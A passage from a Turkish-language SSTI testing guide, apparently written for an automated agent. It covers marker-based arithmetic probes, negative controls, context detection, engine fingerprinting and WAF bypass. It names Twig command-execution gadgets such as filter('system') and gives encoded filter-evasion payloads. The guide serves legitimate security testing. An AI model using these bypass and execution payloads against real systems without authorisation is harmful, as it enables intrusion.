   `[[44444444-8888]]` — ham sonucu, çarpma probe'uyla **aynı** olan
   `44435556` üreteni işaretle (bkz. yukarıdaki "tek bir ortak hedef
   değer" tasarım kararı).
   Çarpma probe'u negatif dönse bile çıkarma probe'unu dene — bu ikisi
   birbirinin **yerine geçen** değil **birbirini tamamlayan** iki ayrı
   deneme yoludur (bkz. yukarıdaki "Aritmetik Probe Seçimi" gerekçesi).
   Bir varyant hata veriyorsa (`{{6666/0}}` gibi sıfıra bölme denemesi
   de bir sinyal üretir — bazı motorlar bunu özel bir hata mesajıyla
   karşılar, bu da engine fingerprint'ine katkı sağlar).
3. **String evaluation:** `{{6666*'6666'}}` — Jinja2/Tornado gibi
   motorlarda string tekrar davranışı gösterir (`'6666'` 6666 kez
   tekrarlanmış uzun bir string üretir), Twig'de hata verir. Tam
   string eşleşmesi yerine uzunluk/response-size farkına bakmak da
   geçerli bir sinyaldir, ama bu yalnızca destekleyici (probable
   seviyesinde) bir sinyaldir.
4. **Boolean/comparison:** `{{1==1}}` / `{{1==2}}` çiftinin response
   farkını izle. Bu **tek başına zayıf** bir sinyaldir — yalnızca
   aritmetik probe ile birlikte destekleyici kanıt olarak kullan.
5. **Variable interpolation:** Uygulamanın bilinen bir değişkenini
   (örn. kullanıcı adı) template sözdizimiyle çağırmayı dene:
   `{{username}}` — uygulama gerçekten basıyorsa güçlü sinyal.
6. **Error-based:** Kasıtlı bozuk sözdizimi (`{{6666*6666`,
   `${6666*6666`, `<%= 6666*6666`) gönder, stack trace/şablon hatası
   dönüp dönmediğine bak (bkz. §7 Fingerprinting — hata mesajları
   çoğu zaman engine adını doğrudan verir, bu en güvenilir sinyaldir).
7. **Çarpma ve çıkarma da negatif dönüyor ama karakterler encode
   edilmiş şekilde yansıyorsa:** §8.2.3'teki karakter-seviyesi encoding
   oracle tekniğine geç — bu, delimiter karakterlerinin (`{`, `}`, `*`,
   `-`) hangi encoding'le motora ulaştığını sistematik olarak dener.

### Pozitif Sayılma Kuralı — Gerekli Ama "Confirmed" İçin Tek Başına Yeterli Değil

**Pratik payload formu (KRİTİK — aşağıdaki kuralın önkoşulu):** Yukarıdaki
"Aşamalı Generic Probe Sırası"nda adım 1 (marker-only) ve adım 2/2b
(arithmetic) ayrı ayrı açıklanmıştır, ama pratikte **tek bir istekte
birleştirilerek** gönderilir — yalnız `{{6666*6666}}` göndermek, sonucun
sayfanın neresinde ortaya çıktığını (ve gerçekten senin payload'ından mı
geldiğini) belirsiz bırakır. Standart form marker'ı expression'ın içine
gömer:
```
AAA_SSTI_1234_{{6666*6666}}_ZZZ
AAA_SSTI_1234_{{44444444-8888}}_ZZZ
```
Beklenen pozitif response — **her iki payload için de aynı**:
`AAA_SSTI_1234_44435556_ZZZ` (veya motorun kendi native probe'uyla,
örn. Django için `AAA_SSTI_1234_{{6666|add:6666}}_ZZZ` →
`AAA_SSTI_1234_13332_ZZZ`). Aşağıdaki üç şart bu **birleşik** payload'a
göre tanımlanır:

Bir probe'un **evaluation evidence** sayılması için:
1. Canary marker (`AAA_SSTI_1234`/`ZZZ`) response'ta bulunuyor **ve**
2. Hesaplanan ham sonuç (`44435556`) tam olarak
   marker'ın **arasında/yerinde** görünüyor — yani expression gerçekten
   evaluate edilmiş, marker'dan bağımsız/uzak bir yerde tesadüfen
   bulunan bir sayı değil **ve**
3. Geçerli bir **negatif kontrol** (bkz. §5.1 — aşağıda) farklı bir
   sonuç veriyor.

Bu üç şart **evaluation evidence** için minimum settir. §8.4'e göre
bu tek başına **SSTI için "confirmed" olarak yeterlidir** — ayrı bir
engine fingerprint kanıtı **şart değildir** (bkz. §8.3 Eksen 1/Eksen 2
ayrımı). Engine'in kendisi hâlâ "probable" veya "unknown" kalabilir,
bu SSTI sonucunu değiştirmez.

### 5.1 Negatif Kontrol Nasıl Kurulur — KRİTİK DÜZELTME

**Yanlış/yetersiz yaklaşım (kullanılmaz):** Payload'ın URL-encode
edilmiş halini (`%7B%7B6666*6666%7D%7D`) "negatif kontrol" olarak
göndermek **tek başına güvenilir değildir** — çünkü sunucu bu string'i
bir noktada URL-decode edebilir ve decode edilmiş hali yine template
motoruna ulaşıp evaluate edilebilir. Yani "encoded hali de aynı sonucu
verdi" demek her zaman "SSTI yok" anlamına gelmez; tam tersine, bazen
bu bile pozitif bir sinyal olabilir (decode zincirinin varlığını
gösterir — bkz. §8.2.3). Bu nedenle **"encoded = negatif kontrol"
kuralı bu skill'de kullanılmaz.**

**Doğru/tercih edilen yaklaşım — differential comparison:** İki
yapısal olarak benzer ama **farklı deterministic sonuç** üreten
expression'ı karşılaştır:
```
AAA_SSTI_1234_{{6666*6666}}_ZZZ   → beklenen: 44435556
AAA_SSTI_1234_{{6666*6665}}_ZZZ   → beklenen: 44428890 (FARKLI sonuç)
```
Eğer uygulama yalnızca literal string'i reflect ediyorsa (evaluation
yok), her iki payload da **birebir aynı şekilde** (işlenmemiş metin
olarak) görünür — aralarında fark olmaz. Eğer gerçekten evaluate
ediliyorsa, iki farklı sayı görünür. Bu, "encoded vs plain" karşılaştırmasından
çok daha güvenilirdir çünkü bir decode/encode zincirinin varlığına
bağımlı değildir — doğrudan **evaluation'ın kendisini** test eder.
Aynı teknik çıkarma probe'u için de uygulanır — negatif kontrol olarak
çıkaran sayıyı bir birim kaydır: `44444444-8888` (→ `44435556`) vs
`44444444-8887` (→ `44435557`, FARKLI sonuç).

**Alternatif — genuinely non-evaluating literal-escape:** Motorun
kendi sözdizimini bilerek bozan bir varyant (örn. dengesiz delimiter:
`AAA_SSTI_1234_{{6666*6666_ZZZ` — kapanış `}}` olmadan) de bir negatif
kontrol olarak kullanılabilir: bu, sözdizimi geçersiz olduğu için
evaluate edilmemesi beklenir; edilirse (örn. hata mesajı dönerse) bu
zaten ayrı bir sinyal (error-based fingerprinting, §7) olarak
değerlendirilir.

**Özet kural:** Negatif kontrol seçerken "bu temsil kesinlikle
evaluate edilmez" varsayımını **encoding'e dayandırma** — bunun yerine
ya differential comparison (farklı beklenen sonuç) ya da bilinçli
sözdizimi bozma kullan.

---

## 6. Context Detection

### Context Türleri

Payload'ın template kaynağı içinde **nerede** durduğu, hangi kapatma
karakterlerinin gerektiğini belirler:

- **Plain text context** — herhangi bir etiket/attribute dışında düz metin.
- **HTML context** — bir HTML etiketinin içeriği olarak.
- **Attribute context** — bir HTML attribute değeri içinde (`value="..."`).
- **String literal context** — template ifadesinin kendi içinde bir
  string literal içinde (tırnak içinde).
- **Expression context** — doğrudan bir `{{ }}`/`${ }` ifadesinin içi.
- **Statement context** — bir kontrol yapısının (`{% if %}`, `<# #>`) içi.
- **Nested template context** — bir template içinde başka bir template
  çağıran include/import yapıları.
- **JavaScript context** — bir `<script>` bloğunun template motoru
  tarafından işlendiği ve ardından tarayıcıda çalıştığı karma durum.
- **CSS context** — nadir ama bazı theme/CSS-in-template sistemlerinde
  mevcut (bkz. §Ekstra Notlar — LESS `@import` code injection, sınırda
  bir örnek).
- **URL/href attribute context** — attribute context'in özel bir alt
  kümesi; encoding kuralları farklıdır (URL-encode gerekebilir).

Aynı payload farklı context'lerde farklı davranır çünkü bazı
context'lerde ekstra kapanış karakteri (`"`, `'`, `}}`) gerekir.

### Context Tespit Prosedürü

1. Önce **kapatma karakteri olmadan** salt bir marker gönder; response'ta
   marker'ın etrafındaki karakterleri incele (örn. `value="MARKER"`
   görülüyorsa attribute context).
2. Sırasıyla olası kapatıcı dizileri ekle: `"`, `'`, `}}`, `%}`, `-->`
   — hangisinin syntax hatasını **düzelttiğini** (ortadan kaldırdığını)
   gözlemle. Hatayı gideren kapatıcı, doğru context'i işaret eder.
3. Context bilgisi elde edildikten sonra payload'ı otomatik olarak bu
   kapatıcı ön-ek ile zenginleştir (örn. `"}}{{6666*6666}}{{"`).

Context ve engine fingerprinting birlikte ilerletilmelidir: context
bilgisi hangi kapatıcının gerektiğini, fingerprinting hangi delimiter
ailesinin kullanılacağını belirler — ikisi birleşince nihai payload
oluşur.

### Type Confusion / Object-Context SSTI — SSTI ile Karışma Riski (KRİTİK SINIR)

Bir parametrenin uygulama tarafından `getattr(obj, user_input)` gibi
kullanılması **tek başına ve otomatik olarak SSTI değildir**. Bu daha
genel bir **unsafe attribute/property access** problemidir ve SSTI'den
tamamen ayrı, kendi başına bir zafiyet sınıfı olarak da var olabilir
(bu skill'in kapsamı dışındadır).

**SSTI sayılması için gereken şart:** Kontrol akışının gerçekten
template/expression **derleme (compile) veya evaluation** mekanizmasına
girmesi gerekir — yani girdi, motorun template AST'sini/bytecode'unu
üreten veya çalıştıran koda ulaşmalıdır (bkz. §3 Source→Sink). Girdi
yalnızca zaten var olan bir Python/Java/Ruby attribute-access
ifadesinin **parametresi** olarak kullanılıyorsa (template motoru hiç
devreye girmeden) bu "object/property access injection"dır — SSTI
**değildir**.

| | SSTI object-context varyantı | Object/property access injection (SSTI DEĞİL) |
|---|---|---|
| Girdi nereye giriyor | Template motorunun **kendi** expression syntax'ının bir parçası olarak | Template motoru hiç çağrılmadan, doğrudan uygulama kodunda bir attribute adı olarak |
| Motor devrede mi | Evet — motor bunu **derliyor** | Hayır — motor hiç görmüyor |
| Kapsam | Bu skill'in kapsamında | Bu skill'in kapsamı DIŞINDA — ayrı zafiyet sınıfı olarak raporla |

**Pratik test:** Motorun **kendi** delimiter/expression sözdizimini
(`{{ }}`, `${ }` vb.) parametre değeri olarak dene. Bu sözdizimi
**motor tarafından derleniyorsa** (yalnızca bir string olarak reflect
edilmiyorsa) → gerçek SSTI. Yalnızca `.`, `[]`, `__class__` gibi düz
attribute-access karakterlerinin kabul edilmesi ama template
delimiter'larının **derlenmemesi** → bu bir SSTI değil, object/property
access injection'dır. "sort", "filter", "field", "attr", "expr",
"order_by" gibi parametre isimlerini test ederken bu ayrım özellikle
önemlidir.

**EL Injection ile ayrım (Thymeleaf/SpEL bağlamı için de geçerli):**
SSTI'de saldırgan **template kaynağının kendisini** kontrol eder (örn.
`th:text="${...}"` attribute'unun tamamı kullanıcıdan geliyor); EL
Injection'da yalnızca bir SpEL ifadesinin **değeri** kontrol edilir ama
ifade zaten sabit koddadır. Şüpheli durumlarda bu ayrımı raporda açıkça
belirt, gerekirse EL Injection olarak sınıflandır (kapsam dışına çıkar).

---

## 7. Template Engine Fingerprinting — Confidence Seviyeli Sinyal Modeli

Generic detection **pozitif** çıktıktan sonra "hangi engine?" sorusuna
cevap arayan aşama. Amaç, minimum request ile ayrım yapmak.

### Bu Bir "Kesin Karar Ağacı" Değildir

Aynı davranış (örn. `{{6666*6666}}`'nın çalışması) şunlara göre
değişebilir: **engine sürümü, uygulamanın configuration'ı, kayıtlı
custom filter/function'lar, sandbox durumu, context.** Bu nedenle her
gözlem bir **confidence seviyesiyle** etiketlenmelidir:

- **Strong indicator** — engine'e özgü, taklit edilmesi zor bir sinyal
  (örn. stack trace'te tam paket/sınıf adı geçmesi:
  `freemarker.core.ParseException`).
- **Medium indicator** — birden fazla engine'de görülebilir ama belirli
  bir aileyi güçlü şekilde destekler (örn. `${ }` delimiter'ının
  çalışması → Java-family olasılığı yüksek, ama kesin değil). **Önemli
  ayrım:** `${ }`'ın çalışması size yalnızca "bir EL/SpEL-benzeri
  expression-language ailesi" olduğunu söyler — bu, **spesifik bir
  template engine kimliği** (FreeMarker mi, Velocity mi, Thymeleaf mi)
  değildir; bunlar aynı yüzeysel sözdizimini paylaşan ama farklı
  implementasyonlardır. Expression-language family tespiti ile engine
  attribution (§7'nin geri kalanı, §12.2 profilleri) **ayrı aşamalardır**
  — biri diğerinin yerine geçmez.
- **Weak indicator** — tek başına düşük ayırt edicilik (örn. `{{ }}`
  delimiter'ının çalışması — hem Jinja2/Nunjucks hem Twig hem Pebble'da
  ortak).
- **Negative indicator** — bir davranışın **olmaması** da bilgi verir
  (örn. `{{6666*6666}}`'nın çalışmaması + `{{ }}` delimiter'ının
  reflect edilmesi → Django Templates/Handlebars/Mustache olasılığını
  artırır, çünkü bu motorlar aritmetik desteklemez).

### Hipotez Takibi — Fingerprint Bir Ranking'dir, Deterministik Sınıflandırma Değil

Agent, tek bir "engine budur" kararına erken kilitlenmek yerine bir
**hipotez kümesi** tutmalı ve her yeni sinyalle bu kümeyi güncellemeli:

```
engine_hypotheses:
  - Jinja2:   leading    (2 medium + 1 weak indicator destekliyor)
  - Twig:     candidate  (1 weak indicator — delimiter ortak)
  - Pebble:   candidate  (1 weak indicator — delimiter ortak)
  - Freemarker: ruled-out (${ } delimiter'ı reflect edilmedi)
```

Durum etiketleri:
- **leading** — şu ana kadarki en güçlü kombinasyon; sonraki probe
  bunu doğrulamaya/çürütmeye yönelik seçilir.
- **candidate** — elenmemiş ama leading'den daha zayıf destekli.
- **ruled-out** — bir Negative/Strong-contradicting indicator ile
  fiilen elenmiş; tekrar test edilmez (§2 duplicate önleme).

**Bilinçli olarak sayısal olasılık (örn. "%72") kullanılmıyor** —
elimizde bu tür bir skoru kalibre edecek veri yok, sahte kesinlik
false-confidence yaratır. Bunun yerine yukarıdaki üç durum yeterlidir.
`leading` hipotez yalnızca en az bir **Strong indicator** ile
doğrulandığında `confirmed` engine'e dönüşür — o zamana kadar §12'deki
ilgili profile "muhtemel" olarak dallanılır, ama başka bir engine
profilinin de test edilebilir olduğu unutulmaz (§1.6 fallback
zincirinde "version biliniyor mu?" adımı, engine hipotezi confirmed
olduktan sonra devreye girer).

### Sinyal Toplama Sırası (Rehber, Kesin Akış Değil)

```
{{6666*6666}} → 44435556 mı?
 ├─ Evet → {{6666*'6666'}} davranışı gözlemlenir
 │    ├─ Uzun tekrar string üretir (6666 kez "6666") → Jinja2/Nunjucks/
 │    │    Tornado ailesi → §12.1 (Jinja Ailesi)
 │    ├─ Hata verir → Twig olabilir → {{'6666'*6666}} ve {{_self}} dener
 │    │    → §12.1 (Twig)
 │    └─ Farklı davranış → §12 ile devam
 ├─ Çalışmıyor ama {{ }} delimiter reflect ediliyor, aritmetik yok →
 │    Django Templates / Handlebars / Mustache olasılığı (negative +
 │    weak indicator kombinasyonu) — **bu üçü birbirinden çok farklı
 │    motorlardır, tek sinyalle burada durma:** ayırt etmek için
 │    `{% load %}`/`{{ var|filter }}` (Django'ya özgü statement/filtre
 │    sözdizimi, §12.1) vs `{{#if}}`/`{{#each}}` (Handlebars'a özgü
 │    block helper sözdizimi, §12.3) vs `{{#section}}`/`{{^section}}`
 │    (Mustache'e özgü inverted-section sözdizimi) dene — hangisi
 │    hata vermeden kabul ediliyorsa o aile → §12.1/§12.3
 └─ Hayır (hiç {{ }} tepkisi yok) → ${6666*6666} dene
      ├─ Evet → Java-family olasılığı (Freemarker/Velocity/Thymeleaf/
      │    Pebble/EL) → §12.2 ile devam
      └─ Hayır → #{6666*6666} / <%= 6666*6666 %> / [[6666*6666]] dene
           (Ruby/EJS/Pebble/ASP ailesi) → §12.3, §12.4
```

Bu sıralama, delimiter + arithmetic + string-evaluation sinyallerini
kullanarak minimum request ile ayrımı **daraltır**, ama tek bir
davranış gözlemine dayanarak "kesin engine X'tir" sonucuna
**varılmamalıdır** — en az bir Strong indicator (tercihen error
message tabanlı) elde edilene kadar sonuç "probable" olarak
işaretlenmelidir.

### Ek Sinyaller

- **Error message fingerprinting (Strong indicator):**
  `jinja2.exceptions.TemplateSyntaxError`, `Twig\Error\SyntaxError`,
  `freemarker.core.ParseException`,
  `org.apache.velocity.exception.ParseErrorException`,
  `org.thymeleaf.exceptions`, `com.mitchellbosecke.pebble` /
  `io.pebbletemplates` — mevcut sinyaller arasında en güvenilir olanı,
  ama debug modu kapalıysa hiç alınamayabilir.
- **HTTP header/teknoloji sinyalleri (Weak indicator):** `X-Powered-By`,
  session cookie isimlendirmesi (`JSESSIONID`→Java, vb.), `Server`
  header'ı — **doğrulayıcı değil, önceliklendirici** sinyaller.
- **HTML/kaynak artefaktları (Medium indicator):** CMS'e özgü meta
  tag'ler (`<meta name="generator" content="Craft CMS">`) §13'deki
  CMS→engine tablosuna yönlendirir.
- **Timing (Weak/Medium indicator):** Bazı engine'lerin belirli ağır
  expression'ları farklı sürede işlemesi de bir fingerprint sinyali
  olabilir (blind timing tekniğiyle aynı prensip, burada engine ayrımı
  için).
- **Escaping filtre kabulü (Medium indicator):** Bir engine'e özgü
  escape filtresinin (`|safe`, `|raw`, `?html`) kabul edilip
  edilmediği engine ailesini daraltır.
- **Sıfıra bölme davranışı:** `${6666/0}`, `{{6666/0}}`, `<%= 6666/0 %>`
  gibi denemeler bazı engine'lerde özel bir hata mesajı üretir; bu da
  bir Medium/Strong indicator olabilir.

### Negative Capability Matrix — Beklenen "Çalışmama" Davranışı

Fingerprinting şimdiye kadar ağırlıklı olarak "bu payload çalışırsa
şu engine" (pozitif sinyal) üzerine kuruldu. Bunun tamamlayıcısı: her
engine için **hangi davranışın çalışmaması beklenir** — bir negatif
sonuç, engine hipotezini ELEMEK yerine yanlışlıkla "SSTI yok"
sonucuna sürüklememeli, çünkü o davranış zaten o engine'de **hiç
olmaz**:

| Engine | Beklenen NEGATİF (bu motorda normaldir, "SSTI yok" anlamına gelmez) |
|---|---|
| Django Templates | `{{6666*6666}}` çalışmaz (aritmetik yok) — §12.1 |
| Liquid | `{{6666*6666}}` çalışmaz (aritmetik yok, filtre gerekir) — §12.3 |
| Handlebars/Mustache | `{{6666*6666}}` çalışmaz (logic-less) — §12.3 |
| Go text/template | `{{6666*6666}}` çalışmaz (operatör desteği yok) — §12.4 |
| FreeMarker | `#{6666*6666}` çalışmayabilir (config'e göre, bkz. §12.2 — bu **elemez**) |
| EJS | `{{6666*6666}}` çalışmaz (delimiter `<% %>` ailesi) — §12.3 |
| Razor | `@(...)` dışında bir generic evaluation genelde yoktur; ham `{{ }}` reflect edilir — §12.4 |
| Thymeleaf | Expression evaluation (SpEL üzerinden aritmetik/boolean/comparison) **vardır ve çalışır** — bunun negatif çıkması SSTI'yi elemez, sadece SpEL'in kapalı olduğunu gösterir. Asıl nadir olan şey **kullanıcı girdisinin runtime'da bir template KAYNAĞI** (view/fragment string'i) haline gelmesidir — bkz. §12.2 Thymeleaf, "düşük başarı ihtimali" notu. Bu "nadir ama sıfır değil" durumun somut mekanizması **fragment expression preprocessing** (`__${...}__`) ve **Spring View Manipulation**'dır (bkz. §12.2 Thymeleaf "Expression preprocessing" ve ayrı "Spring View Manipulation" alt bölümü) — kullanıcı girdisi view/fragment adı olarak kullanıldığında, "nadir" senaryo pratikte oldukça yaygın bir gerçek saldırı yüzeyine dönüşür. Yani: `${6666*6666}` çalışmıyorsa Thymeleaf değildir/SpEL kapalıdır (gerçek negatif); ama `${6666*6666}` **çalışıyor olması da** kullanıcı girdisinin template kaynağı olduğunu kanıtlamaz — bu ayrı bir §3 Source→Sink sorusudur |
| Twig | `sort('system')` tipi string-callback payload'ları bazı sürüm/konfigürasyonlarda çalışmayabilir — bu Twig'i ELEMEZ, yalnızca bu gadget'ın kapalı olduğunu gösterir; versiyon numarasına göre kesin bir "çalışır/çalışmaz" kuralı yoktur, bkz. §12.1 Twig — Sandbox notu |

**Kullanım kuralı:** Bir negatif sonuç gördüğünde önce bu tabloya bak
— "bu motorda zaten beklenen bir negatif mi" sorusunu sormadan
"SSTI yok" sonucuna varma. Tablo negatif dese bile motor hâlâ
application-specific bir yüzeyden (custom filter/helper/context
objesi) etkilenebilir; bu yüzden negatif capability, testin bittiği
anlamına gelmez, yalnızca **hangi yüzeyin artık aranmaması gerektiği**
anlamına gelir.

### Kurallar

- Birden fazla engine aynı uygulamada bulunabilir (örn. ana site Twig,
  e-posta alt sistemi Freemarker) — fingerprinting **her endpoint için
  ayrı** yapılmalı, tek bir sonuç tüm uygulamaya genellenmemelidir.
- Engine fingerprint edilemezse (tüm sinyaller negatif/belirsiz),
  §6'daki context detection'a geri dön ve gerekirse polyglot
  payload'larla (§5 — düşük öncelikli triage) tekrar dene.
- Versiyon farkları önemlidir (örn. Twig 1.x'te bazı `_self`
  erişimleri farklı davranırken sonraki sürümlerde sandbox extension
  varsayılan hale gelmiştir; Freemarker 2.3.30 öncesi sürümlerde farklı
  sandbox bypass teknikleri geçerlidir — bkz. §12.2) — confirmation
  aşamasında versiyon-spesifik payload alternatifleri de denenmelidir.
- **Raporlama kuralı:** Nihai raporda engine adı **"confirmed"**
  (Strong indicator + bağımsız doğrulama var) veya **"olası/probable"**
  (yalnızca weak/medium indicator var) olarak açıkça etiketlenmelidir.

---

## 8. Encoding, WAF/Filter, Evidence Kategorileri, False Positive/Negative

### 8.1 Encoding / Transformation Etkisi

Input, template motoruna ulaşmadan önce şu katmanlardan geçebilir:
URL decode → uygulama seviyesi custom decode (örn. Base64) → charset
dönüşümü → framework'ün otomatik unescape'i → (opsiyonel) WAF/filter
kontrolü → template motoru.

**Pratik yaklaşım:**
- Bir parametrenin Base64/hex/URL-encoded olup olmadığını response
  davranışından çıkar.
- Şüpheleniliyorsa payload'ı hem düz hem encode edilmiş halde dene.
- İkisi de negatifse "çoklu encode katmanı olabilir" varsayımıyla
  çift/üçlü encode varyantlarını sırayla dene. **Önemli gerçek dünya
  örneği:** Bazı uygulamalar bir parametreyi yalnızca **tek kez**
  URL-decode eder; eğer payload'ın kendisi `%25` (yani encode edilmiş
  `%`) içeriyorsa ve bu tek decode sonrası hâlâ encode kalan bir alt
  katman template motoruna ulaşıyorsa, bu bir **WAF/filter bypass**
  tekniği olarak kullanılabilir — filtre `{%set%}` gibi literal bir
  string arıyorsa ama gerçek istekte bu `%25set%25` olarak gönderilip
  sunucu tarafında tek decode sonrası `%set%` haline geliyorsa (ya da
  tam tersi bir kaçış zinciri), filtre bunu yakalayamayabilir. Bu
  tekniğin somut bir uygulaması için bkz. §12.1 Twig — Gerçek Dünyada
  Doğrulanmış Payload'lar.
- Engine-özgü escaping filtreleri (Jinja2 `|safe`/`|escape`, Twig
  `|raw`, Freemarker `?html`/`?no_esc`) hem fingerprint sinyali hem de
  filter-bypass aracıdır.

### 8.2 WAF / Filter — Sıralı Akış

**Sıra:** Detection → Filter identification → Transformation var mı
tespiti → Alternative representation → Re-test. "Detection başarısız
oldu → bypass payload'ı yağdır" **değildir**.

1. **Detection:** Generic probe'lar denenir (§5).
2. **Filter identification:** Hangi karakter/kelime filtreleniyor
   tespit edilir (örn. `{{` her zaman 403 dönüyor ama parçalanmış hali
   dönmüyor).
3. **Transformation var mı tespiti:** Uygulamanın kendisi mi
   (sanitizer) yoksa önündeki bir WAF mı engelliyor — davranış farkı
   (hata sayfası yapısı, header'lar) ile ayırt edilir.
4. **Alternative representation:** Yalnızca detection **pozitif**
   çıktıktan sonra, sınırlı sayıda, agresiflik artan sırada denenir:
   - String concatenation
   - Case değişikliği
   - Whitespace/yorum ekleme
   - Ek encoding katmanları (bkz. §8.1'deki double-encoding örneği)
   - Motorun kendi sözdizimiyle delimiter'ı dinamik üretme (örn.
     Twig'de `{{ '{{' }}`)
   - Filtre zinciri kullanarak tek bir "yasaklı" fonksiyon adını
     dolaylı çağırma (örn. Twig'de doğrudan `system(...)` yazmak
     yerine `['id']|filter('system')` gibi array-üzerinden dolaylı
     çağırma — bkz. §12.1)
5. **Re-test:** Alternative representation ile generic probe tekrar
   denenir.

Bu sıralama gereksiz request'i azaltır ve WAF tarafından engellenme/ban
riskini düşürür.

### 8.2.1 Bypass Payload Taksonomisi (B1–B12)

§8.2 adım 4'teki teknikler, "şimdi hangi bypass ailesini denemeliyim"
kararını hızlandırmak için adlandırılmış kategoriler halinde:

| Kod | Kategori | Örnek |
|---|---|---|
| B1 | Encoding | URL/hex/unicode encode edilmiş delimiter |
| B2 | Double encoding | §8.1'deki `%25set%25` örneği |
| B3 | Case transformation | `{{`→ motor case-insensitive ise karışık büyük/küçük harf |
| B4 | Whitespace insertion | `{{ 6666*6666 }}` yerine iç boşluk varyasyonları |
| B5 | Comment insertion | Motorun kendi yorum sözdizimini (`{# #}` vb.) delimiter arasına sokma |
| B6 | String concatenation | `'sys'~'tem'` gibi parçalanmış fonksiyon adı |
| B7 | Character construction | Karakterleri kod noktasından/charcode'dan üretme |
| B8 | Indirect function reference | Fonksiyon adını değişkene atayıp değişken üzerinden çağırma (bkz. §12.1 Twig `{% set %}` tekniği) |
| B9 | Filter/callback abuse | `sort`/`map`/`filter` gibi array filtrelerini callback taşıyıcı olarak kullanma (bkz. §12.1) |
| B10 | Alternate delimiter | Motorun kendi sözdizimiyle delimiter'ı dinamik üretme (`{{ '{{' }}`) |
| B11 | Nested evaluation | Bir evaluation sonucunu başka bir evaluation'a girdi yapma |
| B12 | Parser differential | Bkz. §8.2.2 |

Bu tablo **denenecek payload listesi değil**, bir sınıflandırmadır —
her kategori için somut payload'lar ilgili engine profilinde (§12)
zaten mevcuttur veya orada aranmalıdır. Yeni bir bypass bulunduğunda
bu tabloya bir satır eklemek, gelecekteki triage'ı hızlandırır.

### 8.2.2 Parser Differential Payload'lar

§8.1'deki çift URL-encoding örneği, aslında daha genel bir sınıfın tek
bir örneğidir: istek, hedefe ulaşana kadar birden çok **parser
katmanından** geçer (WAF parser → framework decoder → application
parser → template parser) ve bu katmanlar aynı input'u **farklı**
yorumlayabilir. Bir katman "güvenli" gördüğü halde bir sonraki katman
tehlikeli forma decode edebilir. Aranması gereken decode/normalize
farkları yalnızca URL encoding ile sınırlı değildir:

- URL decode (tek/çift/üçlü katman)
- HTML entity decode (`&#123;` vb.)
- Unicode normalization (NFC/NFD farkları, homoglyph'ler)
- JSON string escaping (`\u007b`)
- Backslash/quote escaping farkları
- Form (`application/x-www-form-urlencoded`) decode davranışı
- `%uXXXX` (legacy IIS/JS-style) encoding
- İç içe (nested) template evaluation — bir evaluation sonucunun tekrar
  parse edilmesi

**Pratik test — signal-driven, otomatik değil:** Bu, **her payload'a
varsayılan olarak** uygulanacak bir adım değildir — yalnızca §8.2'deki
WAF/Filter akışı bir **delivery/filter sinyali** (403, beklenmedik
strip/encode davranışı, generic probe'un düz metin olarak reflect
olması) tespit ettiğinde devreye girer; aksi halde gereksiz request
bütçesi tüketir. Sinyal varsa: baseline (düz payload) zaten denenmiş
olmalı; sırada tek bir encode seviyesi (en olası olanı — hedefin
teknolojisine göre URL encode veya HTML entity) dene ve **yalnızca
davranışta bir değişiklik (evaluation sinyali belirdi/kayboldu)
gözlenirse** bir sonraki temsile geç. Yani:
```
baseline (düz payload) → filter sinyali VAR mı?
  ├─ hayır → encoding denemeyi atla, generic detection'a devam
  └─ evet → tek encode dene → farklı davranış mı?
              ├─ evet → transformation evidence, bu temsili kullanmaya devam
              └─ hayır → çift encode dene → ... (bütçe dolana kadar)
```
Bir WAF belirli bir literal string'i (`{% set` gibi) arıyor ama
trafiğin gerçek decode zinciri farklıysa, bu genellikle filtrenin
atlatılabileceğinin işaretidir — ama bu **yalnızca bir bypass
sinyalidir**, SSTI'nin var olduğunun kanıtı değildir; asıl kanıt yine
§5'teki generic evaluation probe'unun (encode edilmiş haliyle)
derlenmesidir.

### 8.2.3 Karakter-Seviyesi Encoding Oracle — Delimiter Karakterlerini Ayrı Ayrı Encode Ederek Tetikleme

**Bu bölüm gerçek bug bounty deneyiminden gelen, önemli bir tekniktir.**
Bazı hedeflerde payload'ın **tamamı** değil, yalnızca **belirli özel
karakterler** (`{`, `}`, `*`, `-`) bir output-encoding veya WAF/filter
katmanı tarafından dönüştürülür — bu, §8.1'deki genel "tüm payload'ı
encode et" yaklaşımından farklı, **karakter bazlı** bir oracle
tekniği gerektirir.

**Adım 1 — Gözlem:** Düz bir payload gönder (örn. `{6666*6666}` veya
`{{6666*6666}}`) ve response'ta bu **belirli karakterlerin** ne
şekilde yansıdığına bak:
- `{` ve `}` karakterleri response'ta **encode edilmiş** biçimde mi
  görünüyor (örn. `%7B`, `&#123;`, `&lbrace;`)?
- `*` karakteri encode edilmiş mi, yoksa **olduğu gibi mi** kalıyor?

Bu gözlem, hangi karakterlerin bir dönüşüm katmanından geçtiğini,
hangilerinin geçmediğini gösterir — ve bu bilgi, **hangi karakteri
encode edip hangisini düz bırakman gerektiğini** belirler.

**Adım 2 — Karar kuralı:**
- `{`/`}` encode edilmiş yansıyor, `*` (veya `-`) **düz** yansıyorsa
  → yalnızca `{`/`}` karakterlerini encode et, `*`/`-` karakterini
  **encode etme**.
- `{`/`}` encode edilmiş yansıyor **ve** `*`/`-` de encode edilmiş
  yansıyorsa → tüm delimiter+operatör karakterlerini encode et.
- Hiçbiri encode edilmiş yansımıyorsa (hepsi düz) → bu teknik gerekli
  değil, standart §5 probe'larına devam et.

**Adım 3 — Denenecek encoding varyantları (delimiter karakterleri
için, artan karmaşıklık sırasıyla; her biri transit için ayrıca
URL-encode edilerek gönderilir — `%26` = `&`, `%23` = `#`, `%3B` = `;`,
`%5C` = `\`):**

1. **HTML decimal entity (URL-encoded transit):**
   ```
   %26%23123;6666*6666%26%23125;
   ```
   (decode edildiğinde: `&#123;6666*6666&#125;` → HTML decimal entity
   ile `{` ve `}`)

2. **Zero-padded HTML decimal entity (bazı parser'lar yalnızca
   sabit uzunluklu decimal entity'yi tanır/kabul eder):**
   ```
   %26%230000123;6666*6666%26%230000125;
   ```
   (decode edildiğinde: `&#0000123;6666*6666&#0000125;`)

3. **HTML hex entity (URL-encoded transit):**
   ```
   %26%23x7B;6666*6666%26%23x7D;
   ```
   (decode edildiğinde: `&#x7B;6666*6666&#x7D;` → hex entity ile
   `{` ve `}`)

4. **Unicode escape (JS-tarzı, URL-encoded transit):**
   ```
   %5Cu007B6666*6666%5Cu007D
   ```
   (decode edildiğinde: `\u007B6666*6666\u007D`)

Aynı dört varyant, **çıkarma probe'u için de birebir aynı mantıkla**
uygulanır (`{44444444-8888}` içindeki `{`/`}` karakterlerini aynı
şekilde encode ederek dene) — çarpma ve çıkarma bu teknikte de eşit
